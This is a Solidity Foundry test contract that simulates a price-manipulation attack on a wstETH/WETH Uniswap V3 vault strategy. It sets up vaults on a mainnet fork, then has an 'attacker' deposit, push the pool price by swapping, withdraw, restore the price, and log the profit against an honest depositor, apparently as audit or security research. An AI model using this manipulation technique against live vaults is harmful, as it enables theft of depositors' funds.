// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./helpers/libraries/LiquidityAmounts.sol";
import "./helpers/libraries/TickMath.sol";
import "./helpers/libraries/FullMath.sol";

import "../lib/forge-std/src/console2.sol";
import "../lib/forge-std/src/Vm.sol";
import "../lib/forge-std/src/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../test/helpers/IWETH.sol";
import "../test/helpers/IWSTETH.sol";
import "../test/helpers/ISTETH.sol";
import "../test/helpers/ICurvePool.sol";
import "../test/helpers/ISwapRouter.sol";
import "../test/helpers/INonfungiblePositionManager.sol";
import "../test/helpers/IProtocolGovernance.sol";
import "../test/helpers/IUniV3Helper.sol";
import "../test/helpers/ILStrategyHelper.sol";
import "../test/helpers/IVaultRegistry.sol";
import "../test/helpers/IUniV3VaultGovernance.sol";
import "../test/helpers/IERC20VaultGovernance.sol";
import "../test/helpers/IERC20RootVaultGovernance.sol";
import "../test/helpers/libraries/PermissionIdsLibrary.sol";
import "../src/MockCowswap.sol";
import "../src/LStrategy.sol";
import "../src/ERC20Validator.sol";
import "../src/CowSwapValidator.sol";
import "../src/MockOracle.sol";
import "./FeedContract.sol";

import "../src/UniV3VaultSpot.sol";
import "../src/UniV3VaultSpotGovernance.sol";

contract AdvancedAttack is Test {
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public wsteth = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public uniswapV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address public uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public deployer = address(this);
    address public admin = 0x565766498604676D9916D4838455Cc5fED24a5B3;
    address public governance = 0xDc9C17662133fB865E7bA3198B67c53a617B2153;
    address public registry = 0xFD23F971696576331fCF96f80a20B4D3b31ca5b2;
    address public helper = 0x1E13A22d392584B24f5DDd6E6Da88f54dA872FA8;
    address public uniGovernance;
    address public uniGovernanceOld = 0x8306bec30063f00F5ffd6976f09F6b10E77B27F2;
    address public erc20Governance = 0x0bf7B603389795E109a13140eCb07036a1534573;
    address public rootGovernance = 0x973495e81180Cd6Ead654328A0bEbE01c8ad53EA;
    address public lStrategyHelper = 0x9Cf7dFEf7C0311C16C864e8B88bf3261F19a6DB8;
    address public router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address public mockOracleAddress;
    address public stethContractAddress = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address public attacker = 0x341C245124CCDCe62655a29207acBee0f6e3135a;
    address public depositor = 0xC6576F7F84E75B89DB0ad847d796760ba8Fda5f9;

    address rootVault;
    LStrategy lstrategy;

    uint256 constant Q96 = 1 << 96;

    function setupUniGovernance() public {
        UniV3VaultSpot spotVault = new UniV3VaultSpot();
        IVaultGovernance.InternalParams memory params_ = IVaultGovernance.InternalParams(
            IProtocolGovernance(governance),
            IVaultRegistry(registry),
            IVault(spotVault)
        );
        IUniV3VaultGovernance.DelayedProtocolParams memory protocolParams_ = IUniV3VaultGovernance(uniGovernanceOld)
            .delayedProtocolParams();
        uniGovernance = address(new UniV3VaultSpotGovernance(params_, protocolParams_));
        vm.startPrank(admin);
        uint8[] memory permissions = new uint8[](2);
        permissions[0] = PermissionIdsLibrary.CREATE_VAULT;
        permissions[1] = PermissionIdsLibrary.REGISTER_VAULT;
        IProtocolGovernance(governance).stagePermissionGrants(uniGovernance, permissions);
        vm.warp(block.timestamp + IProtocolGovernance(governance).governanceDelay());
        IProtocolGovernance(governance).commitPermissionGrants(uniGovernance);
        vm.stopPrank();
    }

    function combineVaults(address[] memory tokens, uint256[] memory nfts) public {
        IERC20RootVaultGovernance rootVaultGovernance = IERC20RootVaultGovernance(rootGovernance);
        vm.startPrank(admin);
        for (uint256 i = 0; i < nfts.length; ++i) {
            IVaultRegistry(registry).approve(rootGovernance, nfts[i]);
        }
        (IERC20RootVault w, uint256 nft) = rootVaultGovernance.createVault(tokens, address(lstrategy), nfts, admin);
        rootVault = address(w);
        rootVaultGovernance.setStrategyParams(
            nft,
            IERC20RootVaultGovernance.StrategyParams({
                tokenLimitPerAddress: type(uint256).max,
                tokenLimit: type(uint256).max
            })
        );

        rootVaultGovernance.stageDelayedStrategyParams(
            nft,
            IERC20RootVaultGovernance.DelayedStrategyParams({
                strategyTreasury: deployer,
                strategyPerformanceTreasury: deployer,
                managementFee: 0,
                performanceFee: 0,
                privateVault: false,
                depositCallbackAddress: address(0),
                withdrawCallbackAddress: address(0)
            })
        );

        vm.warp(block.timestamp + IProtocolGovernance(governance).governanceDelay());
        rootVaultGovernance.commitDelayedStrategyParams(nft);

        vm.stopPrank();

        mint(weth, deployer, 10**10);
        mint(wsteth, deployer, 10**10);
        IERC20(weth).approve(rootVault, 10**10);
        IERC20(wsteth).approve(rootVault, 10**10);
        uint256[] memory toDeposit = new uint256[](2);
        toDeposit[0] = 10**10;
        toDeposit[1] = 10**10;
        w.deposit(toDeposit, 0, "");
    }

    function setupSecondPhase(IWETH wethContract, IWSTETH wstethContract) public payable {
        ICurvePool curvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
        IERC20 steth = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

        wethContract.approve(address(curvePool), type(uint256).max);
        steth.approve(address(wstethContract), type(uint256).max);
        vm.prank(attacker);
        steth.approve(address(wstethContract), type(uint256).max);
        vm.prank(depositor);
        steth.approve(address(wstethContract), type(uint256).max);
        wethContract.withdraw(2 * 10**21);

        curvePool.exchange{value: 2 * 10**21}(0, 1, 2 * 10**21, 0);

        wstethContract.wrap(10**18 * 1990);

        wstethContract.transfer(address(lstrategy), 3 * 10**17);
        wethContract.transfer(address(lstrategy), 3 * 10**17);

        MockOracle mockOracle = new MockOracle();
        mockOracleAddress = address(mockOracle);
        IUniV3VaultGovernance uniV3VaultGovernance = IUniV3VaultGovernance(uniGovernance);

        vm.startPrank(admin);
        uniV3VaultGovernance.stageDelayedProtocolParams(
            IUniV3VaultGovernance.DelayedProtocolParams({
                positionManager: INonfungiblePositionManager(uniswapV3PositionManager),
                oracle: IOracle(mockOracle)
            })
        );

        vm.warp(block.timestamp + 86400);
        uniV3VaultGovernance.commitDelayedProtocolParams();

        lstrategy.updateTradingParams(
            LStrategy.TradingParams({
                maxSlippageD: 10**7,
                oracleSafetyMask: 0x20,
                orderDeadline: 86400 * 30,
                oracle: mockOracle,
                maxFee0: 10**9,
                maxFee1: 10**9
            })
        );

        lstrategy.updateRatioParams(
            LStrategy.RatioParams({
                erc20UniV3CapitalRatioD: 5 * 10**7, // 0.05 * DENOMINATOR
                erc20TokenRatioD: 5 * 10**8, // 0.5 * DENOMINATOR
                minErc20UniV3CapitalRatioDeviationD: 10**7,
                minErc20TokenRatioDeviationD: 5 * 10**7,
                minUniV3LiquidityRatioDeviationD: 2 * 10**6
            })
        );

        lstrategy.updateOtherParams(
            LStrategy.OtherParams({minToken0ForOpening: 10**6, minToken1ForOpening: 10**6, secondsBetweenRebalances: 0})
        );

        vm.stopPrank();
    }

    function getPool() public returns (IUniswapV3Pool) {
        IUniV3Vault lowerVault = lstrategy.lowerVault();
        return lowerVault.pool();
    }

    function getCapital(
        uint256 amount0,
        uint256 amount1,
        int24 realTick
    ) internal pure returns (uint256 capital) {
        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(realTick);
        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 2**96);
        // TODO: check order
        return FullMath.mulDiv(amount0, priceX96, 2**96) + amount1;
    }

    function getTotalCapital(int24 realTick) internal view returns (uint256 capital) {
        (uint256[] memory minTvl, uint256[] memory maxTvl) = IERC20RootVault(rootVault).tvl();
        require(minTvl[0] == maxTvl[0] && minTvl[1] == maxTvl[1], "Invariant on tvl is wrong");
        return getCapital(minTvl[0], minTvl[1], realTick);
    }

    function getLpPriceD18(int24 realTick) internal view returns (uint256 priceD18) {
        uint256 capital = getTotalCapital(realTick);
        uint256 supply = IERC20RootVault(rootVault).totalSupply();
        return FullMath.mulDiv(capital, 10**18, supply);
    }

    function buildInitialPositions(uint256 width, uint256 startNft) public {
        int24 tick = getUniV3Tick();
        changePrice(tick);

        int24 semiPositionRange = int24(int256(width)) / 2;
        int24 tickLeftLower = (tick / semiPositionRange) * semiPositionRange - semiPositionRange;
        int24 tickLeftUpper = tickLeftLower + 2 * semiPositionRange;

        int24 tickRightLower = tickLeftLower + semiPositionRange;
        int24 tickRightUpper = tickLeftUpper + semiPositionRange;

        IUniV3Vault lowerVault = lstrategy.lowerVault();
        IUniV3Vault upperVault = lstrategy.upperVault();

        preparePush(lowerVault, tickLeftLower, tickLeftUpper);
        preparePush(upperVault, tickRightLower, tickRightUpper);

        {
            uint256[] memory nfts = new uint256[](3);
            nfts[0] = startNft;
            nfts[1] = startNft + 1;
            nfts[2] = startNft + 2;

            address[] memory tokens = new address[](2);
            tokens[0] = wsteth;
            tokens[1] = weth;

            combineVaults(tokens, nfts);
        }
    }

    function mint(
        address token,
        address addr,
        uint256 amount
    ) public {
        uint256 currentBalance = IERC20(token).balanceOf(addr);
        deal(token, addr, currentBalance + amount);
    }

    function initialMint() public payable {
        uint256 smallAmount = 10**13;
        mint(weth, deployer, smallAmount);

        IWETH wethContract = IWETH(weth);
        IWSTETH wstethContract = IWSTETH(wsteth);
        ICurvePool curvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
        IERC20 steth = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

        wethContract.approve(address(curvePool), type(uint256).max);
        steth.approve(address(wstethContract), type(uint256).max);

        wethContract.withdraw(smallAmount / 2);
        curvePool.exchange{value: smallAmount / 2}(0, 1, smallAmount / 2, 0);
        wstethContract.wrap(((smallAmount / 2) * 99) / 100);
    }

    function getUniV3Tick() public returns (int24) {
        IUniswapV3Pool pool = getPool();
        (, int24 tick, , , , , ) = pool.slot0();
        return tick;
    }

    function changePrice(int24 tick) public {
        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, Q96);
        MockOracle(mockOracleAddress).updatePrice(priceX96);
    }

    function makeDesiredPoolPrice(int24 tick, address changer) public {
        IUniswapV3Pool pool = getPool();
        uint256 startTry = 10**16 * 10000;

        uint256 needIncrease = 0;

        while (true) {
            (, int24 currentPoolTick, , , , , ) = pool.slot0();
            if (currentPoolTick == tick) {
                break;
            }

            if (currentPoolTick < tick) {
                if (needIncrease == 0) {
                    needIncrease = 1;
                    startTry = startTry / 2;
                }
                swapTokens(changer, changer, weth, wsteth, startTry);
            } else {
                if (needIncrease == 1) {
                    needIncrease = 0;
                    startTry = startTry / 2;
                }
                swapTokens(changer, changer, wsteth, weth, startTry);
            }
        }
    }

    function swapTokens(
        address sender,
        address recepient,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) public {
        uint256 balance = IERC20(tokenIn).balanceOf(sender);
        if (tokenIn == weth) {
            mintWeth(sender, amountIn);
        } else {
            mintWsteth(sender, amountIn);
        }

        vm.startPrank(sender);

        IERC20(tokenIn).approve(router, type(uint256).max);

        ISwapRouter(router).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: 500,
                recipient: recepient,
                deadline: type(uint256).max,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        vm.stopPrank();
    }

    function fullPriceUpdate(int24 tick, address changer) public {
        makeDesiredPoolPrice(tick, changer);
        changePrice(tick);
    }

    function preparePush(
        IUniV3Vault vault,
        int24 tickLower,
        int24 tickUpper
    ) public {
        uint256 vaultNft = vault.nft();
        vm.prank(admin);
        IVaultRegistry(registry).approve(deployer, vaultNft);

        (uint256 nft, , , ) = INonfungiblePositionManager(uniswapV3PositionManager).mint(
            INonfungiblePositionManager.MintParams({
                token0: wsteth,
                token1: weth,
                fee: 500,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: 10**9,
                amount1Desired: 10**9,
                amount0Min: 0,
                amount1Min: 0,
                recipient: deployer,
                deadline: type(uint256).max
            })
        );

        INonfungiblePositionManager(uniswapV3PositionManager).safeTransferFrom(deployer, address(vault), nft);
    }

    fallback() external payable {}

    receive() external payable {}

    function setup() public payable returns (uint256 startNft) {
        vm.deal(address(this), 0 ether);
        initialMint();

        setupUniGovernance();

        uint256 uniV3PoolFee = 500;
        ISwapRouter swapRouter = ISwapRouter(uniswapV3Router);
        INonfungiblePositionManager positionManager = INonfungiblePositionManager(uniswapV3PositionManager);

        IWETH wethContract = IWETH(weth);
        IWSTETH wstethContract = IWSTETH(wsteth);

        wethContract.approve(uniswapV3PositionManager, type(uint256).max);
        wstethContract.approve(uniswapV3PositionManager, type(uint256).max);

        IProtocolGovernance protocolGovernance = IProtocolGovernance(governance);

        {
            IProtocolGovernance.Params memory params = protocolGovernance.params();
            params.withdrawLimit = type(uint256).max / 10**18;
            vm.prank(admin);
            IProtocolGovernance(governance).stageParams(params);
        }

        {
            uint8[] memory args = new uint8[](1);
            args[0] = PermissionIdsLibrary.ERC20_VAULT_TOKEN;
            vm.prank(admin);
            protocolGovernance.stagePermissionGrants(wsteth, args);
        }

        vm.warp(block.timestamp + protocolGovernance.governanceDelay());
        vm.startPrank(admin);
        protocolGovernance.commitPermissionGrants(wsteth);
        protocolGovernance.commitParams();
        vm.stopPrank();

        address[] memory tokens = new address[](2);
        tokens[0] = wsteth;
        tokens[1] = weth;

        IVaultRegistry vaultRegistry = IVaultRegistry(registry);

        uint256 erc20Nft = vaultRegistry.vaultsCount() + 1;

        vm.startPrank(admin);

        {
            IERC20VaultGovernance erc20VaultGovernance = IERC20VaultGovernance(erc20Governance);
            erc20VaultGovernance.createVault(tokens, admin);
        }

        {
            IUniV3VaultGovernance uniV3VaultGovernance = IUniV3VaultGovernance(uniGovernance);
            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
        }

        vm.stopPrank();

        MockCowswap mockCowswap = new MockCowswap();
        IERC20Vault erc20Vault = IERC20Vault(vaultRegistry.vaultForNft(erc20Nft));
        IUniV3Vault uniV3LowerVault = IUniV3Vault(vaultRegistry.vaultForNft(erc20Nft + 1));
        IUniV3Vault uniV3UpperVault = IUniV3Vault(vaultRegistry.vaultForNft(erc20Nft + 2));

        lstrategy = new LStrategy(
            positionManager,
            address(mockCowswap),
            erc20Vault,
            uniV3LowerVault,
            uniV3UpperVault,
            ILStrategyHelper(lStrategyHelper),
            admin,
            uint16(vm.envUint("width"))
        );
        ERC20Validator wstethValidator = new ERC20Validator(IProtocolGovernance(governance));

        vm.startPrank(admin);
        protocolGovernance.stageValidator(wsteth, address(wstethValidator));
        vm.warp(block.timestamp + protocolGovernance.governanceDelay());
        protocolGovernance.commitValidator(wsteth);

        CowswapValidator cowswapValidator = new CowswapValidator(protocolGovernance);

        protocolGovernance.stageValidator(address(mockCowswap), address(cowswapValidator));
        vm.warp(block.timestamp + protocolGovernance.governanceDelay());
        protocolGovernance.commitValidator(address(mockCowswap));

        vm.stopPrank();

        mint(weth, deployer, 4 * 10**21);

        setupSecondPhase(wethContract, wstethContract);
        return erc20Nft;
    }

    function mintWeth(address sender, uint256 targetValue) public {
        uint256 balance = IERC20(weth).balanceOf(sender);
        uint256 initialBalance = balance;
        while (balance < targetValue) {
            mint(weth, sender, 3000 * (10**18));
            balance = IERC20(weth).balanceOf(sender);
        }
        if (sender == attacker && balance != initialBalance) {
            console2.log("ATTACKER_MINTED");
            console2.log("WETH");
            console2.log(balance - initialBalance);
        }
    }

    function reportCapital(address addr, int24 tick) internal view {
        console2.log("CAPITAL:");
        if (addr == depositor) {
            console2.log("DEPOSITOR");
        }
        if (addr == attacker) {
            console2.log("ATTACKER");
        }
        console2.log(getCapital(IERC20(wsteth).balanceOf(addr), IERC20(weth).balanceOf(addr), tick));
    }

    function mintWsteth(address sender, uint256 targetValue) public {
        if (sender != deployer) {
            vm.startPrank(sender);
        }
        ISTETH stethContract = ISTETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
        uint256 balance = IERC20(wsteth).balanceOf(sender);
        uint256 initialBalance = IERC20(wsteth).balanceOf(sender);
        while (balance < targetValue) {
            uint256 toMint = 3000 * (10**18);
            mint(weth, sender, toMint);
            if (toMint > IERC20(weth).balanceOf(sender)) {
                toMint = IERC20(weth).balanceOf(sender);
            }
            // if (toMint > weth.balance) {
            //     toMint = weth.balance;
            // }
            IWETH(weth).withdraw(toMint);
            stethContract.submit{value: toMint}(sender);
            uint256 stethBalance = stethContract.balanceOf(sender);
            if (stethBalance < toMint) {
                IWSTETH(wsteth).wrap(stethBalance);
            } else {
                IWSTETH(wsteth).wrap(toMint);
            }
            balance = IERC20(wsteth).balanceOf(sender);
        }
        if (sender == attacker && balance != initialBalance) {
            console2.log("ATTACKER_MINTED");
            console2.log("WSTETH");
            console2.log(balance - initialBalance);
        }
        if (sender != deployer) {
            vm.stopPrank();
        }
    }

    function swapOnCowswap(int24 tick) public {
        vm.startPrank(admin);
        lstrategy.postPreOrder(0);
        vm.stopPrank();

        (address preOrderTokenIn, , , uint256 preOrderAmountIn, uint256 preOrderMinAmountOut) = lstrategy.preOrder();
        if (preOrderAmountIn == 0) {
            return;
        }
        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96);
        address tokenOut;
        uint256 amountOut;
        if (preOrderTokenIn == weth) {
            amountOut = FullMath.mulDiv(preOrderAmountIn, 1 << 96, priceX96);
            tokenOut = wsteth;
        } else {
            amountOut = FullMath.mulDiv(preOrderAmountIn, priceX96, 1 << 96);
            tokenOut = weth;
        }
        vm.startPrank(address(lstrategy.erc20Vault()));
        IERC20(preOrderTokenIn).transfer(deployer, preOrderAmountIn);
        vm.stopPrank();
        IERC20(tokenOut).transfer(address(lstrategy.erc20Vault()), amountOut);
    }

    function fullRebalance(int24 tick) internal {
        uint256[] memory arr = new uint256[](2);
        for (int24 i = 0; i < 12; ++i) {
            vm.prank(admin);
            lstrategy.rebalanceUniV3Vaults(arr, arr, type(uint256).max);
        }
        for (int24 i = 0; i < 5; ++i) {
            vm.startPrank(admin);
            lstrategy.rebalanceERC20UniV3Vaults(arr, arr, type(uint256).max);
            lstrategy.rebalanceUniV3Vaults(arr, arr, type(uint256).max);
            vm.stopPrank();
            swapOnCowswap(tick);
        }
    }

    function execute(
        int24 rebalanceTick,
        int24 initialTick,
        int24 shiftedTick,
        uint256 depositCapital
    ) public {
        fullPriceUpdate(rebalanceTick, deployer);
        fullRebalance(rebalanceTick);
        uint256[] memory tokenAmounts = new uint256[](2);
        tokenAmounts[0] = 10000 * (10**18);
        tokenAmounts[1] = 10000 * (10**18);
        makeDeposit(tokenAmounts, depositor, rebalanceTick);
        fullPriceUpdate(initialTick, deployer);
        reportCapital(attacker, initialTick);
        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(initialTick);
        console2.log("PRICE: ", FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96));
        console2.log("INITIAL_LP_PRICE: ", getLpPriceD18(initialTick));
        tokenAmounts[0] = depositCapital;
        tokenAmounts[1] = depositCapital;
        makeDeposit(tokenAmounts, attacker, initialTick);
        fullPriceUpdate(shiftedTick, attacker);
        withdrawAll(attacker);
        fullPriceUpdate(initialTick, attacker);
        console2.log("FINAL_LP_PRICE: ", getLpPriceD18(initialTick));
        withdrawAll(depositor);
        reportCapital(attacker, initialTick);
    }

    function makeDeposit(uint256[] memory tokenAmounts, address from, int24 tick) public {
        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96);
        (uint256[] memory tvl, ) = IERC20RootVault(rootVault).tvl();
        uint256 totalCapital = FullMath.mulDiv(tokenAmounts[0], priceX96, 1 << 96) + tokenAmounts[1];
        uint256 ratio = FullMath.mulDiv(tokenAmounts[0], 10 ** 9, tokenAmounts[0] + tokenAmounts[1]);
        tokenAmounts[0] = FullMath.mulDiv(FullMath.mulDiv(totalCapital, ratio, 10 ** 9), 1 << 96, priceX96);
        tokenAmounts[1] = FullMath.mulDiv(totalCapital, 10 ** 9 - ratio, 10 ** 9);
        mintWeth(from, tokenAmounts[1]);
        mintWsteth(from, tokenAmounts[0]);
        vm.startPrank(from);
        IERC20(weth).approve(rootVault, tokenAmounts[1]);
        IERC20(wsteth).approve(rootVault, tokenAmounts[0]);
        IERC20RootVault(rootVault).deposit(tokenAmounts, 0, "");
        vm.stopPrank();
    }

    function withdrawAll(address from) public {
        uint256 balance = IERC20RootVault(rootVault).balanceOf(from);
        uint256[] memory tokenAmounts = new uint256[](2);
        bytes[] memory options = new bytes[](3);
        vm.prank(from);
        IERC20RootVault(rootVault).withdraw(from, balance, tokenAmounts, options);
    }

    function mintMockPosition() public {
        INonfungiblePositionManager positionManager = INonfungiblePositionManager(uniswapV3PositionManager);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: wsteth,
                token1: weth,
                fee: 500,
                tickLower: -10000,
                tickUpper: 10000,
                amount0Desired: 5 * 10**20,
                amount1Desired: 5 * 10**20,
                amount0Min: 0,
                amount1Min: 0,
                recipient: deployer,
                deadline: type(uint256).max
            })
        );
    }

    function test() public {
        address stethGovernance = 0x2e59A20f205bB85a89C53f1936454680651E618e;

        vm.prank(stethGovernance);
        ISTETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84).removeStakingLimit();

        uint256 nft = setup();
        mintMockPosition();
        buildInitialPositions(vm.envUint("width"), nft);

        int24 deviation = int24(vm.envInt("deviation"));
        uint256 attackCapital = vm.envUint("deposit");
        // int24 shift = int24(vm.envInt("shift"));
        for (int24 initialTick = 0; initialTick * 2 <= vm.envInt("width"); initialTick += 10) {
            for (int24 shift = -int24(vm.envInt("width")) * 2; shift <= vm.envInt("width") * 2; shift += 5) {
                console2.log("NEW ROUND");
                execute(initialTick + deviation, initialTick, initialTick + shift, attackCapital);
                vm.warp(block.timestamp + 12);
            }
        }
    }
}
